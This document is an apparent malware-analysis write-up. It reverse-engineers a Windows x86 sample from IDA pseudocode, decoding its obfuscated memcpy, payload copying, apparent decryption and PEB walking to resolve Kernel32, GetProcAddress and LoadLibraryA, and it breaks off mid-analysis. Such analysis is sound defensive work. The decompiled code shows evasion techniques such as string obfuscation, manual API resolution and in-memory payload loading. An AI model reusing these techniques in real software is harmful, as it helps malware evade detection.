# Analysis of malware 3.3  
SHA256: 4970ac5fb8c1f5bbdd14796ac30deeea7d867e09ee0e1e404919263f4346afd5

## Assumptions / Notes found with DIE (Detect It Easy)
- DiE detects no packer
- Environment: ASMx86 
- Architecture: x32

## Static and Dynamic analysis
Let's first quickly analyze the decompiled entry point in IDA.
#### Entry point
```cpp
int __stdcall start(int a1, int a2, int a3)
{
  if ( !dword_40C2A0 )
  {
    dword_40C2A0 = 1;
    sub_406480();
  }
  return sub_402244(a1, a2, a3);
}
```
```cpp
HANDLE sub_406480()
{
  HANDLE result; // eax
  unsigned int v1; // [esp+3C9h] [ebp-8Bh]
  char v2[112]; // [esp+3CDh] [ebp-87h] BYREF

  v1 = 0;
  strcpy(
    v2,
    "nidaght nidaght nidaght nidaght nidaght nidaght nidaghtnidaght nidaght nidaght nidaght nidaght nidaght nidaght");
  result = CreateFileA("?fn?", 2u, 2u, 0, 3u, 0x80u, 0);
  while ( v1 < 0xA )
  {
    SetEndOfFile((HANDLE)0xFF800E96);
    result = (HANDLE)CreateTapePartition((HANDLE)0xFFFFFFFF, 0, 0, 0);
    ++v1;
  }
  return result;
}
```
The first function (`sub_406480`) doesn't seem to do anything useful and the assembly seems to confirm this.
`dword_40C2A0` is initialized to 1 when the program first executes but we're not yet sure if this is relevant yet.
Next we have a call to `sub_402244(a1, a2, a3);`, which is just
#### Code 2
```cpp
int __stdcall sub_4015F3(int a1, int a2, int a3, int a4)
{
  int v5; // eax
  char v7[4]; // [esp+Dh] [ebp-8Bh] BYREF
  int v8; // [esp+11h] [ebp-87h]
  int (__cdecl *v9)(int, char *); // [esp+15h] [ebp-83h] BYREF
  char v10[15]; // [esp+19h] [ebp-7Fh] BYREF
  int v11; // [esp+28h] [ebp-70h]
  void (__cdecl *v12)(char *, int, int, int *); // [esp+2Ch] [ebp-6Ch]
  int (__cdecl *v13)(_DWORD, int, int, int); // [esp+30h] [ebp-68h]
  int v14; // [esp+34h] [ebp-64h] BYREF
  int (__cdecl *v15)(char *); // [esp+38h] [ebp-60h] BYREF
  int v16; // [esp+3Ch] [ebp-5Ch]
  int v17; // [esp+40h] [ebp-58h] BYREF
  _DWORD *v18; // [esp+44h] [ebp-54h] BYREF
  unsigned int i; // [esp+48h] [ebp-50h]
  __int16 v20; // [esp+4Ch] [ebp-4Ch]
  char v21[13]; // [esp+4Eh] [ebp-4Ah] BYREF
  char v22[13]; // [esp+5Bh] [ebp-3Dh] BYREF
  int v23; // [esp+68h] [ebp-30h] BYREF
  int v24; // [esp+6Ch] [ebp-2Ch] BYREF
  int v25; // [esp+70h] [ebp-28h]
  char *v26; // [esp+74h] [ebp-24h]
  int v27; // [esp+78h] [ebp-20h] BYREF
  char v28[12]; // [esp+7Ch] [ebp-1Ch] BYREF
  char v29[16]; // [esp+88h] [ebp-10h] BYREF

  v10[0] = -19;
  v10[1] = 0;
  v10[2] = 9;
  v10[3] = 11;
  v10[4] = 12;
  v10[5] = -8;
  v10[6] = 3;
  v10[7] = -25;
  v10[8] = 9;
  v10[9] = 6;
  v10[10] = 11;
  v10[11] = -4;
  v10[12] = -6;
  v10[13] = 11;
  v10[14] = 0;
  v28[0] = -19;
  v28[1] = 0;
  v28[2] = 9;
  v28[3] = 11;
  v28[4] = 12;
  v28[5] = -8;
  v28[6] = 3;
  v28[7] = -35;
  v28[8] = 9;
  v28[9] = -4;
  v28[10] = -4;
  v28[11] = 0;
  v22[0] = -19;
  v22[1] = 0;
  v22[2] = 9;
  v22[3] = 11;
  v22[4] = 12;
  v22[5] = -8;
  v22[6] = 3;
  v22[7] = -40;
  v22[8] = 3;
  v22[9] = 3;
  v22[10] = 6;
  v22[11] = -6;
  v22[12] = 0;
  v29[0] = -20;
  v29[1] = 5;
  v29[2] = 4;
  v29[3] = -8;
  v29[4] = 7;
  v29[5] = -19;
  v29[6] = 0;
  v29[7] = -4;
  v29[8] = 14;
  v29[9] = -26;
  v29[10] = -3;
  v29[11] = -35;
  v29[12] = 0;
  v29[13] = 3;
  v29[14] = -4;
  v29[15] = 0;
  v21[0] = 2;
  v21[1] = -4;
  v21[2] = 9;
  v21[3] = 5;
  v21[4] = -4;
  v21[5] = 3;
  v21[6] = -54;
  v21[7] = -55;
  v21[8] = -59;
  v21[9] = -5;
  v21[10] = 3;
  v21[11] = 3;
  v21[12] = 0;
  v25 = -1;
  if ( dword_40C2B8 )
  {
    v25 = dword_40C2B8(dword_40C2B4, a2, a3);
    if ( !a2 )
    {
      dword_40C2AC(dword_40C2B4, dword_40C2B0, 0x10000);
      sub_401E3C(dword_40C2A4, dword_40C2B4, dword_40C2A8);
    }
    return v25;
  }
  else
  {
    if ( !sub_406550(&unk_40905C, dword_409058, 0, &v14) )
    {
      v27 = sub_402C80(v14 + 124);
      if ( v27 )
      {
        sub_406690(v27, &unk_409000, 92);
        if ( !sub_406550(&unk_40905C, dword_409058, v27 - 39 + 131, &v14)
          && (v23 = sub_402A20(v27)) != 0
          && (v23 = sub_402B6F(v23)) != 0 )
        {
          sub_402CC3(&v27);
          dword_40C2A4 = (int)NtCurrentPeb();
          if ( !sub_401EB5(dword_40C2A4, &v9, &v15) )
          {
            sub_401DBD(v28, 11, 105);
            sub_401DBD(v10, 14, 105);
            sub_401DBD(v22, 12, 105);
            sub_401DBD(v29, 15, 105);
            sub_401DBD(v21, 12, 105);
            v5 = v15(v21);
            v16 = v5;
            if ( v5 )
            {
              dword_40C2AC = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))v9(v16, v28);
              v12 = (void (__cdecl *)(char *, int, int, int *))v9(v16, v10);
              v13 = (int (__cdecl *)(_DWORD, int, int, int))v9(v16, v22);
              v8 = v9(v16, v29);
              for ( i = (unsigned int)sub_4015F3 & 0xFFFFF000; ; i -= 4096 )
              {
                if ( *(_WORD *)i == 23117 )
                {
                  v14 = *(unsigned __int16 *)(i + *(_DWORD *)(i + 60));
                  if ( (unsigned __int8)v14 == 80 )
                    break;
                }
              }
              if ( (unsigned __int8)sub_402680(i, &v24, 0, 0) )
              {
                v20 = *(_WORD *)(v24 + 18);
                if ( (v20 & 0x2000) != 0 )
                {
                  v18 = (_DWORD *)sub_402C80(0x1Cu);
                  if ( v18 )
                  {
                    v18[2] = v9;
                    v18[3] = v15;
                    v18[5] = v13;
                    v18[6] = dword_40C2AC;
                    v18[4] = v12;
                    v18[1] = v23;
                    if ( (unsigned __int8)sub_402680(v23, 0, &v17, 0) )
                    {
                      dword_40C2B0 = *(_DWORD *)(v17 + 56);
                      dword_40C2B4 = v13(0, dword_40C2B0, 4096, 64);
                      if ( dword_40C2B4 )
                      {
                        dword_40C2A8 = i;
                        *v18 = dword_40C2B4;
                        dword_40C2B8 = (int (__cdecl *)(_DWORD, _DWORD, _DWORD))(*(_DWORD *)(v17 + 16) + dword_40C2B4);
                        sub_401E3C(dword_40C2A4, i, dword_40C2B4);
                        v25 = sub_40100F(v18);
                        sub_402CC3(&v23);
                        sub_402CC3(&v18);
                      }
                      else
                      {
                        sub_402CC3(&v18);
                        sub_402CC3(&v23);
                      }
                    }
                    else
                    {
                      sub_402CC3(&v18);
                      sub_402CC3(&v23);
                    }
                  }
                }
                else if ( sub_401322(v23, i, v15, v9) )
                {
                  v11 = (char *)sub_40267A - (char *)sub_4022C0;
                  v26 = (char *)v13(0, dword_409048 + (char *)sub_40267A - (char *)sub_4022C0, 4096, 4);
                  if ( v26 )
                  {
                    sub_406690(v26, sub_4022C0, v11);
                    sub_406690(&v26[v11], v23, dword_409048);
                    sub_402CC3(&v23);
                    if ( (unsigned __int8)sub_402680(i, 0, &v17, 0) && (unsigned __int8)sub_402680(&v26[v11], 0, v7, 0) )
                    {
                      v12(v26, dword_409048 + v11, 64, &v14);
                      ((void (__cdecl *)(char *, unsigned int, int (__cdecl *)(_DWORD, _DWORD, _DWORD), void (__cdecl *)(char *, int, int, int *), int (__cdecl *)(_DWORD, int, int, int), int, char *, int))v26)(
                        &v26[v11],
                        i,
                        dword_40C2AC,
                        v12,
                        v13,
                        v8,
                        v26,
                        a4);
                    }
                  }
                  else
                  {
                    sub_402CC3(&v23);
                  }
                }
                else
                {
                  sub_402CC3(&v23);
                }
              }
            }
          }
        }
        else
        {
          sub_402CC3(&v27);
        }
      }
    }
    return v25;
  }
}
```

The first goal here is to understand what this function does in general, so we will analyze each part.
The first branch seems to be irrelevant since by debugging we note that it isn't entered. We will try to analyze the parts of the malware that are actually used, 
and while doing this we'll also rename variables and functions to make the pseudocode clearer.
#### Code 2.5 
```cpp
else
{
  if ( !sub_406550(&unk_40905C, dword_409058, 0, &v14) )
  {
    v27 = sub_402C80(v14 + 124);
    if ( v27 )
    { // ... rest
```
Through the debugger, we see that all these branches are entered. So let's see what the first `sub_406550` does. (Note that `sub_406690` is called from `sub_406550`):
#### Code 3
```cpp
int __cdecl sub_406690(int a1, int a2, int a3)
{
  int result; // eax
  unsigned int v4; // [esp+1BCh] [ebp-4h]

  v4 = 0;
  result = 255 * a3;
  if ( a2 && a1 )
  {
    while ( v4 < 255 * a3 )
    {
      *(_BYTE *)(v4 / 0xFF + a1) = *(_BYTE *)(v4 / 0xFF + a2);
      result = v4 + 255;
      v4 += 255;
    }
  }
  return result;
}

int __cdecl sub_406550(_DWORD *a1, int a2, int a3, unsigned int *a4)
{
  int v5; // [esp+0h] [ebp-10h]
  _DWORD *v6; // [esp+4h] [ebp-Ch]
  unsigned int v7; // [esp+8h] [ebp-8h]
  unsigned int v8; // [esp+Ch] [ebp-4h]

  v6 = a1;
  v8 = 0;
  v5 = 0;
  if ( !a1 || !a2 || !a4 )
    return -1;
  v7 = *a4;
  if ( a3 )
  {
    while ( 1 )
    {
      if ( v5 + *v6 > v7 )
        return -2;
      if ( (char *)v6 + *v6 > (char *)a1 + a2 )
        return -1;
      sub_406690(v5 + a3, v6 + 2, *v6);
      if ( !v6[1] )
        break;
      v5 += *v6;
      v6 = (_DWORD *)((char *)v6 + v6[1]);
    }
    return 0;
  }
  else
  {
    while ( 1 )
    {
      v8 += *v6;
      if ( v6 > (_DWORD *)((char *)a1 + a2) )
        return -1;
      if ( !v6[1] )
        break;
      v6 = (_DWORD *)((char *)v6 + v6[1]);
    }
    *a4 = v8;
    return 0;
  }
}
```
We first analyze the `sub_406690` function since it's called within `sub_406550`, and it may help us uncover what's happening in the latter.
Clearly this line: `*(_BYTE *)(v4 / 0xFF + a1) = *(_BYTE *)(v4 / 0xFF + a2);` already tells us that `a1` and `a2` (the function parameters) are buffers, and it's copying the contents from `a2` to `a1`.
The loop uses this condition: `while ( v4 < 255 * a3 )`, which tells us that `a3` is a size.

If we rename the variables and change their types (for example, the buffer types can be changed to `char*`), we get:
#### Code 4
```cpp
int __cdecl memcopy(char *dest, char *src, int size)
{
  int result; // eax
  unsigned int idx; // [esp+1BCh] [ebp-4h]

  idx = 0;
  totalElementsMultiply255 = 255 * size;
  if ( src && dest )
  {
    while ( idx < 255 * size )
    {
      dest[idx / 255] = src[idx / 255];
      totalElementsMultiply255 = idx + 255;
      idx += 255;
    }
  }
  return totalElementsMultiply255;
}
```
This seems to just be a normal memcpy with some obfuscation. Infact, `255` is mostly irrelevant. For some reason, this function returns the total `elements * 25`, which is just `size * 255`.

We can now analyze the caller (`sub_406550`). There's two branches, and either is taken depending on the `a3` parameter, which in this case is known to be 0. The first branch is:
#### Code 5
```cpp
v6 = a1;
v8 = 0;
v5 = 0;
if ( !a1 || !a2 || !a4 )
  return -1;
v7 = *(_DWORD *)a4;
if ( a3 )
{
  while ( 1 )
  {
    if ( v5 + *(_DWORD *)v6 > v7 )
      return -2;
    if ( &v6[*(_DWORD *)v6] > &a1[a2] )
      return -1;
    memcopy(&a3[v5], v6 + 8, *(_DWORD *)v6);
    if ( !*((_DWORD *)v6 + 1) )
      break;
    v5 += *(_DWORD *)v6;
    v6 += *((_DWORD *)v6 + 1);
  }
  return 0;
}
```
Note that here, I changed the types of `v6`, `a4`, `a3` and `a1` to `char*` since they seem to be buffers. `v6` is a copy of `a1` and `v4` seems to just contain a 4 byte value.
We know that `v7` is a copy of the value contained in `a4` too.

The first thing we note is that `a3` wasn't a flag as we initially thought: it seems to just be a buffer, and if it's null (0 in our case), then the `else` branch is taken.

Thanks to the first comparision we note that `a4` just holds a value similar to a size or capacity. It also seems that `v6` (ie. `a1` buffer) is a structure, and its first 4 bytes (`DWORD`) may be a size.
This line `v6 += *((_DWORD *)v6 + 1);` seems to move the buffer to an offset. So we assume that the second element of the struture may be an offset (a 4 byte DWORD).
Next, `memcopy(&a3[v5], v6 + 8, *(_DWORD *)v6);` seems to just be copying bytes from `v6 + 8` into our `a3` buffer. Here we can confirm that the first member of our structure is a size.
And we can assume that `v6 + 8` is our third data member, which is a payload.

Let's rename the variables, after which the function should become much more understandable:
#### Code 6 (function from Code 5 made nicer)
```cpp
int __cdecl sub_406550(char *input_buffer, int input_buffer_size, char *output_buffer, char *capacity_buffer)
{
  int offset; // [esp+0h] [ebp-10h]
  char *input_buffer_copy; // [esp+4h] [ebp-Ch]
  unsigned int capacity; // [esp+8h] [ebp-8h]
  int total_size; // [esp+Ch] [ebp-4h]

  input_buffer_copy = input_buffer;
  total_size = 0;
  offset = 0;
  if ( !input_buffer || !input_buffer_size || !capacity_buffer )
    return -1;
  capacity = *(_DWORD *)capacity_buffer;
  if ( output_buffer )
  {
    while ( 1 )
    {
      if ( offset + *(_DWORD *)input_buffer_copy > capacity )
        return -2;
      if ( &input_buffer_copy[*(_DWORD *)input_buffer_copy] > &input_buffer[input_buffer_size] )
        return -1;
      memcopy(&output_buffer[offset], input_buffer_copy + 8, *(_DWORD *)input_buffer_copy);
      if ( !*((_DWORD *)input_buffer_copy + 1) )
        break;
      offset += *(_DWORD *)input_buffer_copy;
      input_buffer_copy += *((_DWORD *)input_buffer_copy + 1);
    }
    return 0;
  }
  else
  {
    while ( 1 )
    {
      total_size += *(_DWORD *)input_buffer_copy;
      if ( input_buffer_copy > &input_buffer[input_buffer_size] )
        return -1;
      if ( !*((_DWORD *)input_buffer_copy + 1) )
        break;
      input_buffer_copy += *((_DWORD *)input_buffer_copy + 1); // offset to the next entry
    }
    *(_DWORD *)capacity_buffer = total_size;
    return 0;
  }
}
```
We already found out that the data inside the buffers have this structure layout:
#### Code 7 - buffer entries structure
```cpp
struct Entry {
  std::uint32_t payloadSize;
  std::uint32_t nextEntryOffset;
  char* payload;
```
And of course, we know that the buffers have multiple such entries. For example, `input_buffer` may contain `[entry1, entry2, ..., entry n]`.

The `else` branch, taken if the `output_buffer` is null:
```cpp
else
{
  while ( 1 )
  {
    total_size += *(_DWORD *)input_buffer_copy;
    if ( input_buffer_copy > &input_buffer[input_buffer_size] )
      return -1;
    if ( !*((_DWORD *)input_buffer_copy + 1) )
      break;
    input_buffer_copy += *((_DWORD *)input_buffer_copy + 1); // offset to the next entry
  }
  *(_DWORD *)capacity_buffer = total_size;
  return 0;
}
```
simply iterates the `input_buffer`, and sums the sizes of each entry's `payload`s. Then stores the total size inside a `capacity_buffer` passed by the caller.

So this function simply:

If the output buffer is not null:
- Copies the each entry payload from an input buffer to an output buffer. The input buffer contains multiple entries and each entry is a struct `Entry`.
  The output buffer contains each payload sequentially in memory. (so basically `[[sz1, offset1, payload1][sz2,offset2,payload2]]` will become `[payload1, payload2]`

Otherwise:
- Calculates the total size (ie. the sum of all entries' sizes) from the input buffer and stores it in the capacity buffer.

We can rename it to something like "CopyAndDestructureOrGetTotalSize". Now we can get back to **code 2.5** and rename what we found so far:
```cpp
else
{
  if ( !CopyAndDestructureOrGetTotalSize(global_input_buffer, global_input_size, 0, (char *)&capacity_buffer) )
  {
    tempBuffer = (char *)HeapAllocFn(capacity_buffer + 124);
    if ( tempBuffer )
    {
```
Note that I renamed the second function to `HeapAllocFn` (easily understandable by checking the 5-liner function), and of course what it returns is allocated memory.
Now, for some reason the program is allocating the total `global_input_buffer`'s size + 124. This may be a header size but we don't know yet.


Let's proceed with the next part of the main function that we're analyzing, specifically:
#### Code 8
```cpp
memcopy(tempBuffer, byte_409000, 92);
if ( !CopyAndDestructureOrGetTotalSize(
        global_input_buffer,
        global_input_size,
        tempBuffer + 92,
        (char *)&capacity_buffer)
  && (v23 = (char *)sub_402A20(tempBuffer)) != 0
  && (v23 = (char *)sub_402B6F(v23)) != 0 )
{
  sub_402CC3(&tempBuffer);
  dword_40C2A4 = (int)NtCurrentPeb();
  if ( !sub_401EB5(dword_40C2A4, &v9, &v15) )
  ```
The first line and the `!CopyAndDestructureOrGetTotalSize` function call should be self explainatory since we already analyzed them.
So far, `tempBuffer` contains data as follows: `[92 bytes from byte_409000] [capacity bytes from global_input_buffer] [32 uninitialized bytes]`. 
The last 32 bytes are `124 - 92`; as we recall the program allocated `capacity + 124` bytes above.

Let's now analyze `sub_402A20`:
#### Code 9
```cpp
int __cdecl sub_402A20(int a1)
{
  char v2[16]; // [esp+4h] [ebp-4Ch] BYREF
  unsigned int v3; // [esp+14h] [ebp-3Ch]
  char v4[16]; // [esp+18h] [ebp-38h] BYREF
  int v5; // [esp+28h] [ebp-28h] BYREF
  int v6; // [esp+2Ch] [ebp-24h]
  int v7; // [esp+30h] [ebp-20h]
  int v8; // [esp+34h] [ebp-1Ch]
  int i; // [esp+38h] [ebp-18h]
  char v10[16]; // [esp+3Ch] [ebp-14h] BYREF
  unsigned int j; // [esp+4Ch] [ebp-4h]

  v5 = *(_DWORD *)(a1 + 36);
  v6 = *(_DWORD *)(a1 + 40);
  v7 = *(_DWORD *)(a1 + 44);
  v8 = *(_DWORD *)(a1 + 48);
  for ( i = 0; i != -1; ++i )
  {
    memcopy(v4, (char *)(a1 + 92), 16);
    v5 = *(_DWORD *)(a1 + 36);
    v6 = *(_DWORD *)(a1 + 40);
    v7 = *(_DWORD *)(a1 + 44);
    v8 = *(_DWORD *)(a1 + 48);
    sub_406DCB(v10, i, a1 + 56, 3, sub_406DB0);
    sub_406F12(v4, v10);
    sub_4069F5(v2, v4, 16);
    if ( !sub_406767(&v5, v2, 16) )
    {
      v3 = *(_DWORD *)(a1 + 80);
      for ( j = 0; j < v3; j += 8 )
        sub_406905(j + a1 + 92, v10);
      return a1;
    }
  }
  return a1;
}
```
If we further look into some functions called here, we can assume that this is a decryption routine:
```cpp
int __cdecl sub_406DCB(_DWORD *a1, int a2, __int64 *a3, unsigned int a4, void (__cdecl *a5)(int))
{
  int result; // eax
  unsigned int i; // [esp-14h] [ebp-18h]
  int v7; // [esp-Ch] [ebp-10h]
  int v8; // [esp-8h] [ebp-Ch]
  int v9; // [esp-4h] [ebp-8h]
  int v10; // [esp+Ch] [ebp+8h]

  sub_407280(a2, 1);
  for ( i = 0; i < a4; ++i )
  {
    v9 = *(_DWORD *)a3 ^ sub_40785B();
    v8 = *((_DWORD *)a3 + 1) ^ sub_40785B();
    v7 = (HIWORD(*((_DWORD *)a3 + 1)) | ((unsigned __int16)*(_DWORD *)a3 << 16)) ^ sub_40785B();
    v10 = (v7 * (v8 + v9)) ^ (((*a3 >> 16) ^ sub_40785B()) - v7 * (v8 + v9));
    a5(1);
    sub_407280(v10, 1);
  }
  *a1 = sub_40785B();
  a1[1] = sub_40785B();
  a1[2] = sub_40785B();
  result = sub_40785B();
  a1[3] = result;
  return result;
}
```

My current assumption is that the bytes taken from the global `input_buffer` and `tempBuffer` are an encrypted payload that is going to be decrypted in this function.
For now we will skip the decryption entirely (we assume that our assumptions are correct too), since we're interested in finding the malware's API, and we can hopefully use debuggers to find the encrypted payload at runtime.
If we proceed with our assumption, we can rename the function to something like `getDecrypted`.
For the sake of simplicity we'll also (at least for now) skip analyzing `sub_402B6F` since it's a really long and seemingly complicated function, and may not be needed to find where the malware sets up its APIs.

Finally, we notice this assignment: `dword_40C2A4 = (int)NtCurrentPeb();` [ #### Note1 ]
Specifically, `NtCurrentPeb` is a Windows API function that returns a pointer to the PEB (Process Environment Block) of the current process (the program that we're analyzing).
The PEB is a data structure that has info of the current process, such as image base address, process heap, loaded module lists, etc; each process has its own associated PEB.
We're not yet sure why this is needed at this point, but we'll rename the variable to reflect this.

Next we have another function call, whose return value is checked: `if ( !sub_401EB5(currentPleb, &v9, &v15) )` - Note that v9 and v15 weren't yet used.
#### Code 10
```cpp
int __cdecl sub_401EB5(int a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v4; // [esp+7h] [ebp-4Dh]
  int v5; // [esp+Bh] [ebp-49h]
  __int16 v6[9]; // [esp+Fh] [ebp-45h] BYREF
  int v7; // [esp+21h] [ebp-33h]
  char v9[15]; // [esp+29h] [ebp-2Bh] BYREF
  _DWORD *v10; // [esp+38h] [ebp-1Ch]
  int v11; // [esp+3Ch] [ebp-18h]
  char v12[13]; // [esp+40h] [ebp-14h] BYREF
  _DWORD *v13; // [esp+4Dh] [ebp-7h]

  v10 = 0;
  v13 = 0;
  v6[0] = -30;
  v6[1] = -4;
  v6[2] = 9;
  v6[3] = 5;
  v6[4] = -4;
  v6[5] = 3;
  v6[6] = -54;
  v6[7] = -55;
  v6[8] = 0;
  v12[0] = -29;
  v12[1] = 6;
  v12[2] = -8;
  v12[3] = -5;
  v12[4] = -29;
  v12[5] = 0;
  v12[6] = -7;
  v12[7] = 9;
  v12[8] = -8;
  v12[9] = 9;
  v12[10] = 16;
  v12[11] = -40;
  v12[12] = 0;
  v9[0] = -34;
  v9[1] = -4;
  v9[2] = 11;
  v9[3] = -25;
  v9[4] = 9;
  v9[5] = 6;
  v9[6] = -6;
  v9[7] = -40;
  v9[8] = -5;
  v9[9] = -5;
  v9[10] = 9;
  v9[11] = -4;
  v9[12] = 10;
  v9[13] = 10;
  v9[14] = 0;
  v5 = 0;
  v7 = 0;
  sub_4020FA(v6, 8, 105);
  sub_401DBD(v9, 14, 105);
  sub_401DBD(v12, 12, 105);
  v13 = (_DWORD *)(*(_DWORD *)(a1 + 12) + 12);
  v4 = (_DWORD *)*v13;
  while ( 1 )
  {
    v10 = v4;
    v11 = v4[12];
    if ( !sub_402177(v11, v6) )
      break;
    v4 = (_DWORD *)*v4;
    if ( v4 == v13 )
      goto LABEL_6;
  }
  v11 = v10[6];
  v7 = sub_402883(v11, v9);
  if ( v7 )
  {
    v7 += v10[6];
    v5 = sub_402883(v10[6], v12);
    if ( v5 )
      v5 += v10[6];
  }
LABEL_6:
  if ( !v5 || !v7 )
    return -1;
  *a3 = v5;
  *a2 = v7;
  return 0;
}
```
Here, the first called function is `sub_4020FA(v6, 8, 105);`. The following snippet shows one function called within it (1), and then `sub_4020FA(v6, 8, 105);` (2):
#### Code 11
```cpp
// (0) - function called by sub_4020FA
unsigned int __cdecl sub_40672A(int a1, char a2, unsigned int a3)
{
  unsigned int result; // eax
  unsigned int i; // [esp+8h] [ebp-4h]

  for ( i = 0; ; ++i )
  {
    result = i;
    if ( i >= a3 )
      break;
    *(_BYTE *)(i + a1) = a2;
  }
  return result;
}

// (1)
unsigned int __cdecl sub_4020FA(int buffer, unsigned int a2, unsigned __int8 a3)
{
  unsigned int result; // eax
  char v4[8]; // [esp+4h] [ebp-Ch] BYREF
  unsigned int v5; // [esp+Ch] [ebp-4h]

  v5 = 0;
  result = sub_40672A((int)v4, 0, 6u);
  if ( a3 )
  {
    while ( 1 )
    {
      result = v5;
      if ( v5 >= a2 )
        break;
      *(_WORD *)(buffer + 2 * v5++) += a3;
    }
  }
  return result;
}
```
Note that (0) is basically `memset` - which is used to fill the buffer with a specified value (`a2`).

On the other hand, it's easy to see that (1) simply adds `a3` to each element in the buffer, and the returned value `result` is identical to `a2`, the buffer's size.
Let's rename the functions and variables to see clearly what's going on:
#### Code 12 - Renamed functions from Code 11 (and simplified)
```cpp
void __cdecl addValueToBuffer(char *buffer, unsigned int bufferSize, unsigned __int8 valueToAdd)
{
  char v3[8]; // [esp+4h] [ebp-Ch] BYREF
  unsigned int v4; // [esp+Ch] [ebp-4h]

  v4 = 0;
  memsetFn(v3, 0, 6u);
  if ( valueToAdd )
  {
    while ( v4 < bufferSize )
      *(_WORD *)&buffer[2 * v4++] += valueToAdd;
  }
}
```

Let's get back to **Code 10**. Why are we adding `105` to our buffers?
The reason is simple: the buffers contain some strings, and this is one way to not hardcode them in the program - this makes it harder for whoever analyzes the program to see plain text strings.
Malware often does this to hide whatever it's trying to do.

Now, to find the actual strings, all we need is to add `105` to each value and convert to ASCII; but in reality we don't need to do this since we can just debug the program and see the final strings at runtime.
By doing so, we know that in **Code 10**:
```cpp
sub_4020FA(v6, 8, 105);
sub_401DBD(v9, 14, 105);
sub_401DBD(v12, 12, 105);
```
`v6` is "Kernel32", `v9` is "GetProcAddress" and `v12` is "LoadLibraryA".

After the function calls in **Code 10** we have the following assignments:
```cpp
v13 = (_DWORD *)(*(_DWORD *)(currentPleb + 12) + 12);
v4 = (_DWORD *)*v13;
```
(Note that I renamed `a1` to `currentPleb`, we know this thanks to **Note 1** above.)
Let's first check the PEB structure from Microsoft:
#### Code 13 - Windows PEB (Process Environment Block) Structure
```cpp
typedef struct _PEB {
  BYTE                          Reserved1[2];       // offset 0
  BYTE                          BeingDebugged;      // offset 2
  BYTE                          Reserved2[1];       // Offset 3
  PVOID                         Reserved3[2];       // Offset 4
  PPEB_LDR_DATA                 Ldr;                // Offset 12 (assuming sizeof(PVOID) == 4 in x32)
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;  // Offset 16 (assuming sizeof(void*) == 4 in x32)
  PVOID                         Reserved4[3];       // Offset 20 (assuming sizeof(void*) == 4 in x32)
  PVOID                         AtlThunkSListPtr;   // Offset 32
  PVOID                         Reserved5;          // Offset 36
  ULONG                         Reserved6;          // Offset 40
  PVOID                         Reserved7;          // Offset 44
  ULONG                         Reserved8;          // Offset 48
  ULONG                         AtlThunkSListPtr32; // Offset 52
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```
IDA currently uses `int` for `currentPleb`. Let's change the type to `char*` instead so it's easier to reason about. The new assignment is:
```cpp
v13 = (_DWORD *)(*((_DWORD *)currentPleb + 3) + 12);
v4 = (_DWORD *)*v13;
```
First: `((_DWORD *)currentPleb + 3)` is just `currentPleb + 12`, which is then dereferenced. If the look in the above PEB structure, what we just dereferenced is `Ldr` at offset 12.

From the Microsoft docs, PPEB_LDR_DATA is a pointer to this structure:
```cpp
typedef struct _PEB_LDR_DATA {
  BYTE       Reserved1[8];
  PVOID      Reserved2[3];
  LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```
But after digging more into this structure, apparently on Windows x32 the structure is defined as
```cpp
0x000 Length           : Uint4B
0x004 Initialized      : UChar
0x008 SsHandle         : Ptr32 Void
0x00c InLoadOrderModuleList : _LIST_ENTRY
0x014 InMemoryOrderModuleList : _LIST_ENTRY
0x01c InInitializationOrderModuleList : _LIST_ENTRY
0x024 EntryInProgress  : Ptr32 Void
0x028 ShutdownInProgress : UChar
0x02c ShutdownThreadId : Ptr32 Void
```
The program is accessing Ldr, specifically `Ldr + 12`. My assumption is that `Ldr + 12` for our program is just `InLoadOrderModuleList` - if we use the first structure then it falls into Reserved2, which makes little sense.
(Note that these structures are internal windows structures and as the Microsoft docs say, they can change).

The `InLoadOrderModuleList` (aka `Ldr + 12`) has type `LIST_ENTRY`, which is defined as
```cpp
typedef struct _LIST_ENTRY {
   struct _LIST_ENTRY *Flink;
   struct _LIST_ENTRY *Blink;
} LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;
```

If the assumptions are correct, then the first assignment that we're analyzing end up being:
```cpp
listEntryFlinkPtr = (_DWORD *)(*((_DWORD *)currentPleb + 3) + 12);
```
And the second assignment ends up being a pointer to the first module, since `InMemoryOrderModuleList` contains the loaded modules for the process:
```cpp
modulePointer = (_DWORD *)*FlinkPtr;
```

Let's proceed with the next part of **Code 10**:
```cpp
while ( 1 )
{
  v10 = modulePointer;
  v11 = modulePointer[12];
  if ( !sub_402177(v11, (int)Kernel32String) )
    break;
  modulePointer = (_DWORD *)*modulePointer;
  if ( modulePointer == FlinkPtr )
    goto LABEL_6;
}
```
If we look at the structure for `LDR_DATA_TABLE_ENTRY` (which is the type used by `modulePointer`) at https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/ntldr/ldr_data_table_entry.htm, it looks like `modulePointer[12]` is just the module's name.

So this part of the function is simply comparing that string to "Kernel32" to check if the current module is the Kernel32 module, and if so, it exists the loop. Otherwise it keeps checking the next modules, until the Kernel32 module is found, or modulePointer is the original FlinkPtr (= the head) - in which case the Kernel32 module wasn't found (ie. it's not loaded) and the function returns.

We can rewrite the above function as:
```cpp
while ( 1 )
{
  lastVisitedModule = modulePointer;
  moduleInfo = modulePointer[12]; // moduleName
  if ( !areStringsEqual(moduleName, (int)Kernel32String) )
    break;
  modulePointer = (_DWORD *)*modulePointer;
  if ( modulePointer == FlinkPtr )
    goto LABEL_6;
}
```
Let's proceed with the analysis of **Code 10**:
```cpp
moduleInfo = lastVisitedModule[6]; // lastVisitedModule[6] = ModuleBase (=DllBase), and LastVisitedModule is "Kernel32"
v7 = sub_402883(moduleInfo, GetProcAddressString);
if ( v7 )
{
  v7 += lastVisitedModule[6];
  v5 = sub_402883(lastVisitedModule[6], LoadLibraryAString);
  if ( v5 )
    v5 += lastVisitedModule[6];
}
```
At this point, `lastVisitedModule` must be Kernel32 - otherwise we would've reached `goto LABEL_6` which just returns from the function.
`lastVisitedModule[6]` appears to be `PVOID DllBase` if we follow the structure in the link before.

